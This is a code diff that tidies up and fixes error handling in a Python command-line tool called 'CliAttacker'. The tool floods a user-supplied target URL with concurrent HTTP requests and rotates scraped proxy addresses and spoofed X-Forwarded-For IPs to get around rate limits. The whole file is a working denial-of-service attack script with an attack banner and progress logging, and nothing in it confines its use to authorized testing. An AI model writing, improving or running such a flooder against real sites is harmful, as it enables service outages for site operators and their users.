@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 import aiohttp
 import asyncio
 import random
@@ -28,6 +29,7 @@ proxy_sources = [
     "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt",
 ]
 
+
 class CliAttacker:
     def __init__(self, target_url, num_requests):
         self.target_url = target_url
@@ -41,7 +43,6 @@ class CliAttacker:
         print(f"{message}{Fore.RESET}")
 
     async def fetch_ip_addresses(self, url):
-   
         connector = aiohttp.TCPConnector(ssl=False, limit=10)
         timeout = aiohttp.ClientTimeout(total=10)
         async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
@@ -51,13 +52,12 @@ class CliAttacker:
                     # match ip:port
                     ip_addresses = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}:\d+\b", text)
                     return ip_addresses
-            except Exception as e:
-      
+            except Exception:
                 return []
 
     async def get_all_ips(self):
-        
         sem = asyncio.Semaphore(10)
+
         async def fetch_with_sem(url):
             async with sem:
                 return await self.fetch_ip_addresses(url)
@@ -68,10 +68,12 @@ class CliAttacker:
 
         # If not enough proxies, generate synthetic IPs (for X-Forwarded-For headers)
         if len(all_ips) < 1000:
-            all_ips.extend([
-                f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
-                for _ in range(1000)
-            ])
+            all_ips.extend(
+                [
+                    f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+                    for _ in range(1000)
+                ]
+            )
         return all_ips
 
     async def send_request(self, session, ip_address):
@@ -84,10 +86,9 @@ class CliAttacker:
             "Cache-Control": "no-cache",
             "Connection": "keep-alive",
             "Referer": self.target_url,
-            "X-Request-ID": ''.join(random.choices(string.ascii_letters + string.digits, k=16))
+            "X-Request-ID": "".join(random.choices(string.ascii_letters + string.digits, k=16)),
         }
         try:
-            
             per_request_timeout = aiohttp.ClientTimeout(total=5)
             async with session.get(self.target_url, headers=headers, timeout=per_request_timeout) as response:
                 # treat 2xx as success
@@ -95,15 +96,22 @@ class CliAttacker:
                     self.success_count += 1
                 else:
                     self.fail_count += 1
-         total_done = self.success_count + self.fail_count
+
+                total_done = self.success_count + self.fail_count
                 if total_done % 50 == 0 and total_done != 0:
                     elapsed = time.time() - self.start_time
                     rate = total_done / elapsed if elapsed > 0 else 0
-                    self.log(Fore.RED + f"Requests: {self.success_count} | Failures: {self.fail_count} | Rate: {rate:.1f}/s | IP: {ip_address}")
+                    self.log(
+                        Fore.RED
+                        + f"Requests: {self.success_count} | Failures: {self.fail_count} | Rate: {rate:.1f}/s | IP: {ip_address}"
+                    )
         except Exception as e:
+            # increment fail_count and print concise error for debugging
+            self.fail_count += 1
+            # brief diagnostic; comment out if too verbose
+            print(Fore.YELLOW + f"[request error] {type(e).__name__}: {e}")
 
     async def attack_worker(self, session, ip_cycle, worker_id):
-        
         while self.success_count + self.fail_count < self.num_requests:
             ip_addr = next(ip_cycle)
             await self.send_request(session, ip_addr)
@@ -119,14 +127,11 @@ class CliAttacker:
         self.log(Fore.CYAN + f"Loaded {len(ip_list)} IPs | Starting attack...")
         ip_cycle = itertools.cycle(ip_list)
 
-       
         connector = aiohttp.TCPConnector(limit=100, ssl=False)
-        
+
         async with aiohttp.ClientSession(connector=connector) as session:
-            
             worker_count = min(self.max_concurrent, self.num_requests, 200)
             workers = [asyncio.create_task(self.attack_worker(session, ip_cycle, i)) for i in range(worker_count)]
-           
             await asyncio.gather(*workers, return_exceptions=True)
 
         elapsed = time.time() - self.start_time
@@ -134,6 +139,7 @@ class CliAttacker:
 
     def run(self):
         asyncio.run(self.attack())
+
 
 def print_banner():
     columns = shutil.get_terminal_size().columns
@@ -150,6 +156,7 @@ def print_banner():
     for line in banner.splitlines():
         print(f"{Fore.RED}{line.center(columns)}{Fore.RESET}")
 
+
 if __name__ == "__main__":
     print_banner()
     target_url = input(Fore.RED + "Enter Target URL: ").strip()
@@ -159,8 +166,8 @@ if __name__ == "__main__":
         print(Fore.YELLOW + "Invalid number of requests. Exiting.")
         sys.exit(1)
 
-    if not target_url.startswith(('http://', 'https://')):
-        target_url = 'http://' + target_url
+    if not target_url.startswith(("http://", "https://")):
+        target_url = "http://" + target_url
 
     attacker = CliAttacker(target_url, num_requests)
     attacker.run()
